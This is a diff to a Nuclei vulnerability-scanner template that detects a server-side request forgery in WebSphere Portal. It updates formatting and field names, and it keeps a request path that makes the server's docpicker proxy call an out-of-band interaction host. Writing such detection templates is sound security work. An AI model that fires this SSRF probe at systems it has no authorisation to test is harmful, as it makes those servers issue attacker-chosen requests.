@@ -1,13 +1,14 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: WebSphere-SSRF
 
 info:
   name: Websphere SSRF
   author: Excis3
-  severity: High
+  severity: high
   description: websphere SSRF https://blog.assetnote.io/2021/12/25/advisory-websphere-portal/
   tags: SSRF
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/docpicker/internal_proxy/https/{{interactsh-url}}"
@@ -16,6 +17,5 @@ requests:
     matchers:
       - type: word
         part: interactsh_protocol
-        words: 
+        words:
           - "dns"
-
